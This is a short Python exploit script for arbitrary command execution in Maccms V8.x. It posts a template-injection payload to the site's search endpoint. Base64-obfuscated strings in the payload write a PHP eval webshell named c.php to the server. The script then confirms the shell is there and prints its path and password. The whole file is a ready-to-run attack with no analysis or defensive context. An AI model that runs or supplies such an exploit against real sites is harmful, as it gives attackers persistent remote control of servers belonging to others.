#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Create by yaof
# _PlugName_ =Maccms_V8.x 任意命令执行
import requests


def getshell(arg):
    headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Upgrade-Insecure-Requests': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0'}

    payload = '?m=vod-search'
    target = arg + payload
    payload1 = 'wd={if-A:print(fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29)}{endif-A}'
    r = requests.post(url=target, headers=headers, data=payload1, timeout=5)
    if r.status_code == 200:
       shell = requests.get(url=arg+"/c.php", headers=headers)
       if shell.status_code == 200:
           shell_path = arg + "/c.php"
           print "[*] shell: %s  | pass is: c" % shell_path
    else:
        print "failed!"


if __name__ == '__main__':
     getshell("http://192.168.1.79/maccms8/")
